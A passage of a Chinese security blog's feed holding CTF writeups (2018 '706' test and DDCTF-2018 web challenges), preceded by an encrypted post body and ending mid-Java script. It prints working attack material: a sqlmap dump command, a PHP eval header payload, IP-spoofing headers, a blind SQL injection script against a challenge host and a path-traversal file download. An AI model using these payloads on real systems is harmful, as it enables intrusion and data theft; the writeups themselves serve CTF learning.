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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实对于RSA加密算法攻击的文章，互联网上已经有很多了，所以本文主要还是以整理为主，只列出每种攻击方式的攻击条件、需要的一些工具、具体操作步骤等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
      <category term="crypto" scheme="https://winter3un.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2018 706 writeup</title>
    <link href="https://winter3un.github.io/2018/07/09/2018-706-wp/"/>
    <id>https://winter3un.github.io/2018/07/09/2018-706-wp/</id>
    <published>2018-07-09T11:00:43.000Z</published>
    <updated>2018-07-10T00:52:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>706测试的题目，wp简单写下。</p><a id="more"></a><h2 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h2><p>两张图叠加，010处理下就出来了。</p><h2 id="Misc2"><a href="#Misc2" class="headerlink" title="Misc2"></a>Misc2</h2><p>png的长度设置长一点就出flag</p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>steg 打开，RGB三个最低色道分别来一次，flag组合下就出来了。</p><h2 id="Misc4"><a href="#Misc4" class="headerlink" title="Misc4"></a>Misc4</h2><p>流量包内有jsfuck编码的密码，log文件内有rar文件，拿密码去解压rar文件，就出flag</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>flag直接写在main函数里了。。</p><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>题目算法似乎有问题，反正我是没解出来，好像有人解出来了- -，真流弊</p><h2 id="crypt1"><a href="#crypt1" class="headerlink" title="crypt1"></a>crypt1</h2><p>直接写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf8 -*-</span></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES3</div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">()</span>:</span></div><div class="line">flag=open(<span class="string">"flag.txt"</span>,<span class="string">"rb"</span>).read().strip()</div><div class="line">paclen=<span class="number">8</span>-len(flag)%<span class="number">8</span></div><div class="line">flag+=paclen*(chr(paclen))</div><div class="line"></div><div class="line">key1=<span class="string">"do_you_know_des3"</span></div><div class="line">obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">s1=obj1.encrypt(flag)</div><div class="line"></div><div class="line">key2=<span class="string">"and_you_know_aes"</span></div><div class="line">iv=md5(key2).digest()</div><div class="line">obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">s2=obj2.encrypt(s1)</div><div class="line"><span class="keyword">with</span> open(<span class="string">"flag.enc"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</div><div class="line">f.write(s2)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></div><div class="line">s1=open(<span class="string">"flag.enc"</span>,<span class="string">"rb"</span>).read()</div><div class="line"></div><div class="line">key2=<span class="string">"and_you_know_aes"</span></div><div class="line">iv=md5(key2).digest()</div><div class="line">obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">s2=obj2.decrypt(s1)</div><div class="line"></div><div class="line"></div><div class="line">key1=<span class="string">"do_you_know_des3"</span></div><div class="line">obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">flag=obj1.decrypt(s2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> flag</div><div class="line"></div><div class="line"></div><div class="line">decrypt()</div></pre></td></tr></table></figure><h2 id="crypt2"><a href="#crypt2" class="headerlink" title="crypt2"></a>crypt2</h2><p>Coppersmith攻击了解一下。</p><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>静态编译，ROPgadget了解一下。</p><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>根据0ctf2018 babyheap改的题，把off by one改没了，不知道怎么做= =</p><h2 id="web1-web7"><a href="#web1-web7" class="headerlink" title="web1-web7"></a>web1-web7</h2><p>全是原题，不会做的话，实验吧刷题了解一下。</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>有waf的报错注入，waf只是为了限制考点，很容易绕过</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>格式化字符串，sqlmap了解一下</p><p><code>sqlmap -r post -p username --prefix &quot;%1$&#39;&quot; --suffix &quot;#&quot; -v3 --technique=T -D ctf -T flag --dump</code></p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>命令执行，rctf原题改，getallheaders被禁用了，但是apache_request_headers可以</p><p>payload为<code>eval(next(apache_request_headers()));</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;706测试的题目，wp简单写下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF-2018  WEB WRITEUP</title>
    <link href="https://winter3un.github.io/2018/04/19/ddctf-2018/"/>
    <id>https://winter3un.github.io/2018/04/19/ddctf-2018/</id>
    <published>2018-04-20T05:44:11.000Z</published>
    <updated>2018-04-20T05:48:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>工作需要较强的web安全能力，所以我想通过打ctf的web类题目来提高这方面的水平，以下为这次didictf web类的题解。</p><a id="more"></a><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><img src="/2018/04/19/ddctf-2018/1.png" alt="1.png" title=""><p>非法链接的问题，直接在http头中加入以下键值对绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">X-Originating-IP: 123.232.23.245</div><div class="line">X-Forwarded-For: 123.232.23.245</div><div class="line">X-Remote-IP: 123.232.23.245</div><div class="line">X-Remote-Addr: 123.232.23.245</div></pre></td></tr></table></figure></p><p>其实也可以配置burp的插件bypass waf（<a href="https://www.codewatch.org/blog/?p=408" target="_blank" rel="external">https://www.codewatch.org/blog/?p=408</a> ） ，来绕过限制正常在客户端浏览。</p><img src="/2018/04/19/ddctf-2018/2.png" alt="2.png" title=""><p>emmm…明显考察注入，不过这边的注入点比较隐蔽，在<code>author</code>参数这儿，页面上隐藏了输入点，我们可以直接写python脚本通过盲注的手法跑出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">s = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x20</span>):</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x30</span>,<span class="number">0x7f</span>):</div><div class="line">id = <span class="string">""</span></div><div class="line">title = <span class="string">""</span></div><div class="line">date = <span class="string">""</span></div><div class="line">author = <span class="string">"-1'||if(ord(substr((select secvalue from ctf_key9 limit 0,1),"</span>+str(index)+<span class="string">",1))="</span>+str(i)+<span class="string">",0,1)#"</span></div><div class="line"></div><div class="line"><span class="comment"># select * from content where id = ? and author = ' -1' ||  ' and date = ' = 'a' union '   </span></div><div class="line"></div><div class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</div><div class="line"></div><div class="line">data = &#123; <span class="string">"id"</span>:id,</div><div class="line"><span class="string">"title"</span>:title,</div><div class="line"><span class="string">"author"</span>:author,</div><div class="line"><span class="string">"data"</span>:date,</div><div class="line"><span class="string">"button"</span>:<span class="string">"search"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">t = str(int(time.time()))</div><div class="line"></div><div class="line">str0 = <span class="string">'id='</span>+id+<span class="string">'title='</span>+title+<span class="string">'author='</span>+author+<span class="string">'date='</span>+date+<span class="string">'time='</span>+t+<span class="string">'adrefkfweodfsdpiru'</span></div><div class="line"></div><div class="line"></div><div class="line">sig = hashlib.sha1(str0).hexdigest()</div><div class="line"></div><div class="line"></div><div class="line">ip = <span class="string">'123.232.23.245'</span></div><div class="line"></div><div class="line">headers  = &#123;<span class="string">'X-Originating-IP'</span>: ip,</div><div class="line"><span class="string">'X-Forwarded-For'</span>: ip,</div><div class="line"><span class="string">'X-Remote-IP'</span>: ip,</div><div class="line"><span class="string">'X-Remote-Addr'</span>: ip,</div><div class="line"><span class="string">'X-Client-IP'</span>: ip,</div><div class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"</span>,</div><div class="line"><span class="string">'Referer'</span>:<span class="string">"http://123.232.23.245/"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> len(requests.post(url=<span class="string">"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php?sig="</span>+sig+<span class="string">"&amp;time="</span>+str(int(time.time())),data=data,headers=headers,proxies=proxies).content) != <span class="number">2420</span>:</div><div class="line">s += chr(i)</div><div class="line"><span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div><div class="line"><span class="comment"># print str0</span></div></pre></td></tr></table></figure><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>web2的难度明显要比web1要高。</p><p>点击链接进去后，直接<code>ctrl+u</code>看源码，发现了可疑的链接<br><img src="/2018/04/19/ddctf-2018/3.png" alt="3.png" title=""></p><p>将<code>ZmF2aWNvbi5pY28=</code> base64解码后，发现是<code>favicon.ico</code> ，初步判断该<code>api</code>应该存在任意文件下载漏洞。</p><p>接下来通过构造<code>web.xml</code>的地址(<code>../../WEB-INF/web.xml</code> —base64&gt;&gt;&gt; <code>Li4vLi4vV0VCLUlORi93ZWIueG1s</code>)，并利用该漏洞，下载该配置文件。</p><p>下载完了以后分析该<code>web.xml</code>文件，在文件内发现其他关联的文件，仿照上一步操作，将所有相关的文件都下载到本地分析。</p><p>在<code>web.xml</code>中发现该<code>class</code>文件</p><img src="/2018/04/19/ddctf-2018/4.png" alt="4.png" title=""><p>下载至本地后，用<code>GD-GUI</code>分析发现为<code>flag</code>的加密算法</p><img src="/2018/04/19/ddctf-2018/5.png" alt="5.png" title=""><p>但是我们缺少关键的<code>email</code>和<code>flag</code>密文，继续寻找相关文件，开了下脑洞，猜测控制器文件<code>FlagController.class</code>,没想到真的有233333 下载下来分析。如图，只要我们给<code>email</code>就给我们加密后的<code>flag</code> 233333 </p><img src="/2018/04/19/ddctf-2018/6.png" alt="6.png" title=""><p>回到首页，发现<code>email</code>。。。</p><img src="/2018/04/19/ddctf-2018/7.png" alt="7.png" title=""><p>所有条件都齐全了，逆向算法，最后写出了对应的解密脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.PrintStream;</div><div class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</div><div class="line"><span class="keyword">import</span> java.security.Key;</div><div class="line"><span class="keyword">import</span> java.security.KeyStore;</div><div class="line"><span class="keyword">import</span> java.security.PublicKey;  </div><div class="line"><span class="keyword">import</span> java.security.KeyStoreException;</div><div class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</div><div class="line"><span class="keyword">import</span> java.security.SecureRandom;</div><div class="line"><span class="keyword">import</span> java.security.UnrecoverableKeyException;</div><div class="line"><span class="keyword">import</span> java.security.cert.CertificateException;</div><div class="line"><span class="keyword">import</span> java.util.Properties;</div><div class="line"><span class="keyword">import</span> java.util.UUID;</div><div class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</div><div class="line"><span class="keyword">import</span> javax.crypto.Cipher;</div><div class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</div><div class="line"><span class="keyword">import</span> javax.crypto.Mac;</div><div class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</div><div class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</div><div class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;  </div><div class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;  </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">decrypt</span></span></div><div class="line">&#123;</div><div class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decryptBASE64(String key) <span class="keyword">throws</span> Exception 